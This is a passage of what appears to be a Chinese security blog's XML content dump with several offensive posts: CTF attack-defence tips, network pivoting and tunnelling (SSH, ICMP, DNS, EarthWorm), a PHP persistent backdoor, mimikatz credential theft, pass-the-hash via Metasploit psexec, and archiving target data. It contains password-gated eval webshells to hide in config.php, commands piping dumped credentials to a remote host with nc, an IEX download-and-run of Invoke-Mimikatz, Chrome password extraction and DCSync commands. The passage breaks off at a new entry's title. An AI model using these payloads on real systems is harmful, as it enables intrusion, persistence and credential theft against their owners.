tips:.demo.php前面使用一个点，能很好的隐藏文件。想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('demo.php'); exec('kill -9 $pid');&#125;?&gt; 先查看进程，查看对应的pid，再执行即可。 素质低的人则会放置一个md5马，比如1234&lt;?phpif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')@eval($_POST['cmd']);?&gt; 如果素质低的人又很猥琐，像rootrain这种就是。那就是利用header，最后综合起来就是12345678&lt;?phpecho 'hello';$test= 'flag';if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253') if (@$_SERVER['HTTP_USER_AGENT'] == 'flag')&#123; header("flag:$test");&#125;?&gt; 放进config.php效果最好，因为一般很少人去看这个。 flag获取上面的$shell内容看个人，线下赛可以直接使用&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;之类的，只是说一个点，剩余的发挥空间由你们思考。 最好能写一个批量上传的，结合批量访问。批量访问参考PHP-定时任务或者1234567#!/bin/bashwhile truedo flag=$(curl 'http://172.16.4.42:800') curl --cookie "PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD" --data "key="$&#123;flag&#125; "http://172.16.4.42/index.php/wargame/submit" sleep 1sdone 只有想不到，没有做不到。 日志分析日志分析的用途 感知可能正在发生的攻击，从而规避存在的安全风险 应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本这种脚本网上有很多。12345678910111213&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数$time = date('Y-m-d H:i:s',time()); //访问时间$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";// log记录$fh = fopen("log.txt", "a");fwrite($fh, $logadd);fclose($fh);?&gt; 日志分析工具 LogForensics 腾讯实验室https://security.tencent.com/index.php/opensource/detail/15 北风飘然@金乌网络安全实验室http://www.freebuf.com/sectool/126698.html 网络ID为piaox的安全从业人员：http://www.freebuf.com/sectool/110644.html 网络ID：SecSkyhttp://www.freebuf.com/sectool/8982.html 网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html CTF总结意义所在首先，CTF题是信息安全得基本概念，攻防技术、技巧得浓缩和提炼。通过解题，会快速掌握题目中所包含得概念和技术点，而这些知识在真实得环境中可能比较分散，难以学习，高水平得CTF都是由业内专家命题，往往凝聚着他们多年积累出来的技能。 其次，CTF题注重实际操作，并与基础理论知识相结合。每道CTF都需要实际动手才能找到答案，并且在比赛中经常要拼速度，这对攻防操作得能力会有极高的锻炼。除此之外，高质量得CTF题都没法直接使用现成工具解出，一般需要在理解基本原理的基础上，自己编写代码来求解，这个过程会加深和巩固计算机基础知识得理解。 最后，CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。 不要为CTF而CTF虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试 之 代理篇]]></title>
    <url>%2F2017%2F06%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[整合个端口、代理总结，总觉得好难。慢慢来… 适用网络环境有以下几种： 服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。 判断什么端口能出来VISTA 以下 TCP1FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b telnet 151.101.73.147 %i&quot;) 用 TELNET 不停的连接你的 1-65535 端口, 你本地开个 TCPDUMP 就行了, 如果连通了, 就 OK 。 UDP1FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b nslookup -port=%i rcoil.me 151.101.73.147&quot;) 这个速度慢，但是有效。 VISTA 以后 TCP 1function sT($IP,$Port) &#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try &#123; $sock.Connect($End);[Byte[]] $Message = [char[]]&quot;w00tw00t&quot;;$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)&#125; catch &#123;&#125;;$Sock.Close();&#125;;1..65535 | %&#123; sT -IP &quot;151.101.73.147&quot; -Port $_ &#125; UDP 1function sU($IP, [int]$Port)&#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = &quot;w00tw00t&quot;;$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);&#125;; 1..65535 | %&#123; sU -IP &quot;151.101.73.147&quot; -Port $_ &#125; SSH隧道编辑/etc/ssh/sshd_config文件（服务器端）中：12345GatewayPorts yesPermitRootLogin yesPermitTunnel yes #Tunnel启用ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开 接着重启ssh服务 参数详解：123456789-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了～-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。-R：远程转发-L：本地转发-D：... 端口转发12ssh -qTfnN -L hostport:host:port -l user remote_ip #正向隧道ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道 举个例子12ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是本地端口，本地访问5555就是访问vps的5556。ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是vps的端口，访问vps的5555就是访问本地的5556。 正向代理12345SSH -qTfnN -D port remotehost #直接进行socks代理ssh -qTfnN -D 6080 user@theserver #在本地终端中运行 然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.-q：静默运行 远程转发(反向)12345678910第一步：sudo python -m SimpleHTTPServer 80在目标机子开启80端口服务第二步：ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口第三步：个人PC机器直接使用语句:ssh -p 6666 -qngfNTD 6767 内网用户@VPS这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中 ICMP隧道ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限。 icmpshvps上：1234git clone https://github.com/inquisb/icmpsh.gitapt-get install python-impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207 靶机上：1icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128 就会在vps上接到一个cmdshell。 HTTP代理abptts项目地址首先,安装好工具所需的各种py依赖库:12pip install pycrypto 加密库,整个数据加密都要靠这个pip install httplib2 生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:1python abpttsfactory.py -o webshell 前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，-u 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:1python abpttsclient.py -c webshell\config.txt -u &quot;http://www.rcoil.com/abptts.aspx&quot; -f 127.0.0.1:1234/127.0.0.1:3389 隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:12mstsc 127.0.0.1:1234putty ssh root@127.0.0.1 -p 1234 -i ~/.ssh/xxx/id_rsa 如果对方的ssh只允许证书登录,加载上自己的证书即可 DNS隧道不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。 Iodine它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。使用手册Server端：1iodined -f -c -P password 1.1.1.1 tunneldomain.com Client端：1iodine -f -P password tunneldomain.com -r 成功连接将直接在客户端生成地址1.1.1.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过建立C＆C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用）。它还支持端口转发。Server端：1ruby ./dnscat2.rb tunneldomain.com Client端：1./dnscat2 tunneldomain.com 收到Server端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择一个命令会话session -i ：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as&apos;ping&apos;! For a full list of clients, try &apos;help&apos;.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。 TCP隧道shootbackshootback，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。…. SOCKS在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。 socks代理工具socks代理其实也可理解为一个增强版的 lcx，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。 网络上Socks代理工具有很多，选用的时候尽可能使用无GUI界面的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。 Earthworm工具网址：http://rootkiter.com/EarthWormEW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以正向、反向、多级级联等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。 目前已经有了最新版Termite，工具网址：http://rootkiter.com/Termite/ 官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。 正向 SOCKS v5 服务器在具有公网IP时：1./ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器先在一台具有公网 ip :233.233.233.233的主机A上运行以下命令：1./ew -s rcsocks -l 1080 -e 8888 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口 1./ew -s rssocks -d 233.233.233.233 -e 8888 HackTools 可通过访问=233.233.233.233:1080端口使用 rssocks 主机提供的 socks5 代理服务 二级级联环境示意图： 环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。 12345# V2执行，利用ssocksd方式启动8888端口的socks代理./ew -s ssocksd -l 8888# V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上./ew -s lcx_tran -l 1080 -f 10.255.11.3 -g 8888# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。 1234567# VPS执行，把来自外部的1080端口的流量转到本地的8888端口上./ew –s lcx_listen –l 1080 –e 8888# V2执行，在本地启动socks5代理并监听9999端口./ew -s ssocksd -l 9999# V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.11.3 -g 9999# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 三级级联再提供一个“三级级联”的本地SOCKS测试用例以供参考环境示意图： 环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域123456789# vps上执行，把来自外部的1080端口流量转到本地的8888端口上./ew -s rcsocks -l 1080 -e 8888 # Web server执行，把vps的8888端口和内网V2的9999端口绑定./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.12.2 -g 9999 # V2执行，将来自外部的7777端口和本地的9999端口进行绑定./ew -s lcx_listen -l 9999 -e 7777 # V3执行，将本地的socks连接反弹到V2的7777端口上./ew -s rssocks -d 10.255.12.2 -e 7777 # Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 数据流向: Attack(SOCKS v5) -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks 更多的内容用力戳戳瞎下面这篇文章。 内网漫游之SOCKS代理大结局这篇文章是我见过最全的SOCKS代理 参考：利用ssh端口转发实现Site-to-Site简易VPN通道利用 DNS 隧道传递数据和命令来绕过防火墙A Red Teamer’s guide to pivoting内网漫游之SOCKS代理大结局SSH如何反向代理稳定穿透内网]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>内网</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 定时任务]]></title>
    <url>%2F2017%2F05%2FPHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[写一个关于不死进程,其实也就是定时的进程，时间短那就是无限的启用着。之前有些文章也有这一些函数，但是没有备注。 ignore_user_abort() 函数属于杂项函数。ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。 语法1ignore_user_abort(setting) setting为可选项,如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。如果未设置该参数，会返回当前的设置。 注释PHP 不会检测到用户是否已断开连接，直到尝试向客户机发送信息为止。 set_time_limit() 函数在PHP4，PHP5和PHP7中set_time_limit 是设置脚本最大执行时间 语法1bool set_time_limit ( int $seconds ) seconds最大的执行时间，单位为秒，默认值为30秒。如果设置为0（零），没有时间方面的限制。 file_put_contents() 函数属于Filesystem 函数，这个允许访问和操作文件系统。 file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。 语法1file_put_contents(file,data,mode,context) file为必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data为可选。规定要写入文件的数据。可以是字符串、数组或数据流。mode为可选。规定如何打开/写入文件。context为可选。规定文件句柄的环境。 usleep() 函数usleep() 函数为杂项函数，作用为延迟代码执行若干微秒。 语法1usleep(microseconds) microseconds是必需填写的。以微秒计的暂停时间。 运用demo.php内容为：12345678910111213141516&lt;?phpignore_user_abort(true);set_time_limit(0);$file = &apos;demo.php&apos;;$shell = &quot;&lt;?php phpinfo();?&gt;&quot;; while (TRUE) &#123; file_put_contents($file, $shell);system(&apos;chmod 777 demo.php&apos;);usleep(50);&#125;?&gt; 这种小技巧在留后门上还是有些用的，种了多个demo.php，就可以批量获取demo.php界面内容。123456789101112&lt;?php$array = array( &quot;192.168.xxx.xxx&quot;, &quot;192.168.xxx.xxx&quot;);for($i=0;$i&lt;=1;$i++)&#123;$url = &quot;http://$array[$i]/demo.php&quot;;$contents = file_get_contents($url); echo &quot;$array[$i] &lt;br&gt;&quot;;echo &quot;$contents &lt;br&gt;&lt;br&gt;&quot;;&#125; ?&gt;]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mimikatz使用技巧]]></title>
    <url>%2F2017%2F03%2Fmimikatz%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[mimikatz平时一般使用技巧 0x00 非交换式打印（输出）mimikatz执行过程的log1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir 读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt nc到vps非交互抓明文,不留任何文件,直接把抓取结果用nc发到指定的远程机器(一般是自己的vps)上,可能有些端口出不来,换几个常用的即可,80,8080,443,53……12mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc -vv 192.168.3.251 1234 在目标机器上执行nc -lvp 1234 本地(vps上)机器执行 0x01 两种免杀方式1) 使用powershell1powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot; Tips：powershell 默认windows visa后才有。也可以将结果发送到vps上。 2) procdump lsass 进程导出12C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits 本地使用mimikatz还原123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full 0x02 日常使用1) 黄金票据12345[*] 制作 mimikatz # kerberos::golden /krbtgt:26e67be3519825ba5c9f4f95af987fac /admin:Administrator /domain:rcoil.me /sid:S-1-5-21-3847150913-2250841228-2965060751 /ticket:Administrator.kiribi[*] 使用 mimikatz # kerberos::ptt Administrator.kiribi mimikatz # kerberos::tgt 2) 获取 vpn 密码1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit 3) 浏览器密码1mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:\&quot;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\&quot; /unprotect&quot; exit //读chrome密码 4) 获取某用户的密码1mimikatz lsadump::dcsync /domain:rcoil.me /user:rcoil]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网必修-hash传递-ipc$]]></title>
    <url>%2F2017%2F03%2F%E5%86%85%E7%BD%91%E5%BF%85%E4%BF%AE-hash%E4%BC%A0%E9%80%92-ipc%24%2F</url>
    <content type="text"><![CDATA[这些是刚接触内网的时候了解到的，之前的blog也是写有的。 hsah传递详细原理就看这里：刨根问底：Hash传递攻击原理探究 测试环境：（本机） 目标机:Windows 7 Ultimate 192.168.1.106 攻击机:Linux 4.6.0-kali1-amd64 192.168.1.107 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107msf exploit(psexec) &gt; set LPORT 1024LPORT =&gt; 1024msf exploit(psexec) &gt; show optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate asPayload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.1.107 yes The listen address LPORT 1024 yes The listen portExploit target: Id Name -- ---- 0 Automaticmsf exploit(psexec) &gt; set RHOST 192.168.1.106RHOST =&gt; 192.168.1.106msf exploit(psexec) &gt; set smbuser rcoilsmbuser =&gt; rcoilmsf exploit(psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4msf exploit(psexec) &gt; exploit [*] Started reverse TCP handler on 192.168.1.107:1024 [*] 192.168.1.106:445 - Connecting to the server...[*] 192.168.1.106:445 - Authenticating to 192.168.1.106:445 as user &apos;rcoil&apos;...[*] 192.168.1.106:445 - Selecting PowerShell target[*] 192.168.1.106:445 - Executing the payload...[+] 192.168.1.106:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (957487 bytes) to 192.168.1.106[*] Meterpreter session 1 opened (192.168.1.107:1024 -&gt; 192.168.1.106:50209) at 2017-03-02 06:20:15 +0800meterpreter &gt; shellProcess 3460 created.Channel 1 created.Microsoft Windows [�汾 6.1.7600]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Windows\system32&gt;whoami whoamint authority\system ipc$内网渗透里面不管域还是工作组最先需要介绍的就是ipc连接，这个是内网渗透必修科目，后面绝大多数操作都要基于ipc连接。 ipc$的作用利用IPC$,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。dir、copy、xcopy、move、type等参数都可以使用UNC路径(何为UNC路径？简单来讲以\开头的路径就是UNC路径)。 计划任务说到ipc$，最多的就会提到at和schtasks12345678910111213141516171819202122232425262728C:\Users\John\Desktop&gt;md \\192.168.1.67\c$\users\public\base\C:\Users\John\Desktop&gt;copy base.exe \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;copy bat.bat \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;dir \\192.168.1.67\c$\users\public\base\ Volume in drive \\192.168.1.67\c$ is Windows 7 Volume Serial Number is 44F3-57F8 Directory of \\192.168.1.67\c$\users\public\base08/30/2017 02:35 AM &lt;DIR&gt; .08/30/2017 02:35 AM &lt;DIR&gt; ..08/11/2013 12:40 AM 43,520 base.exe08/30/2017 02:32 AM 32 bat.bat 2 File(s) 43,552 bytes 2 Dir(s) 55,193,870,336 bytes freeC:\Users\John\Desktop&gt;at \\192.168.1.67 4:40 c:\users\public\base\bat.batdded a new job with job ID = 1...删除at任务at /delete /y schtasks是at的升级版。123schtasks /create /tn &quot;base&quot; /tr c:\users\public\base\base.bat /sc once /st 4:50 /S 192.168.1.67 /RU System /u admin /p &quot;1&quot;schtasks /run /tn &quot;base&quot; /S 192.168.1.67 /u admin /p &quot;1&quot; /i #立即执行schtasks /F /delete /tn &quot;base&quot; /S 192.168.1.67 /u admin /p &quot;1&quot; /create表示创建计划任务，/tn表示任务名，/tr指定运行的文件，/sc是任务运行频率，/st是执行时间，/s指定远程机器名或ip地址，/ru指定运行任务的用户权限，这里指定为最高的SYSTEM，/i表示立即运行，/F表示如果指定的任务已经存在，则强制创建任务并抑制警告，/delete是删除任务。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用目标系统现有工具快速打包目标机器数据]]></title>
    <url>%2F2017%2F03%2F%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%8E%B0%E6%9C%89%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[几乎对所有渗透者来讲,初衷或者最终目的无非就是想对目标实施长期监控及数据落地。 在linux机器下的快速打包方式:利用 ‘tar’一般在部署系统时默认都会预先装上,其它还有很多其它的压缩工具,但这里就以最常用的为例。12345678--exclude 排除不打包的文件-c 创建文件-v 显示打包过程-f 指定要打包的文件-z 压缩-X 把要排除的文件名事先写到文件中然后指定它就可以排除多个了-C 解压到指定目录中-p 打包的时候保持原有文件属性 以 gunzip 格式压缩解压:123# find / -name &apos;*.php&apos; -type f | wc -l# tar zcf /tmp/phpfile.tar.gz `find / -name &apos;*.php&apos; -type f` 2&gt; /dev/null &amp;&amp; cd /tmp &amp;&amp; ls ./phpfile.tar.gz &amp;&amp; echo $? &amp;&amp; tar tf phpfile.tar.gz | wc -l 会带上原有的目录结构# tar xf phpfile.tar.gz -C ./ 解压 以 bzip 格式压缩解压:12# tar jcf access.tar.bz access* bzip格式打包压缩文件# tar jxf access.tar.bz zip解压缩 针对大文件的分卷压缩解压:123# tar cjf - /usr/local/apache2/htdocs/ | split -b 1m - www.bz2 2&gt;/dev/null 1m大小分割,直接压缩到当前目录下# cat www.bz2a* | tar xj 分割压缩后的解压方法# ls -lR usr/ 在win机器上的一些快速打包方式7z12345-r 递归压缩-o 指定要输出到的目录-p 指定密码-v 分卷压缩,给的务必要适量,否则文件会非常多a 添加压缩文件 普通压缩解压方式12# 7z.exe -r -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z -oc:\xl 分卷压缩解压方式12# 7z.exe -r -v1m -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z.001 -oc:\xl rar把安装好的winrar安装目录的rar.exe提取出来就可以直接用了,前提是你安装winrar的系统和目标的系统版本要对应,不然可能有些问题(自己觉得库应该是兼容的)123456-a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-x 指定要排除的文件,单位 k,m,g-v 分卷打包,后面跟上单位就好了,打包大文件会很有用-m3,4 使用较好的压缩方式,速度可能会有些慢 以 rar 格式压缩解压12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 把指定目录下的所有文件[包括所有子目录及子目录中的文件,排除txt文件]带密码压缩,然后把压缩好的文件放到c的根下命名成drupal754.rar# Rar.exe x -padmin c:\drupal754.rar c:\xl 带密码保留原有目录结构解压 以 zip 格式压缩解压[用法同上]12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.zip C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# Rar.exe x -padmin c:\drupal754.zip c:\xl 分卷压缩解压12# Rar.exe a -r -v1m -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 压缩# Rar.exe x -padmin c:\drupal754.part01.rar c:\xl 解压 后话:很显然,通关全文,跟技术几乎没有任何关系[仅仅就是几个小工具的简单使用而已],就当留个备忘吧,留给有需要的朋友,另外,打包的时候务必注意下目标分区的大小,不然空间不够,容易出错,文件的元数据要不要一并保存,正在打包的文件是否被占用什么的,有时候打包可能还会有些小小的问题,相信那对你都不是问题]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>内网</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL问题]]></title>
    <url>%2F2016%2F09%2FMySQL%E9%97%AE%E9%A2%98%2F</url>
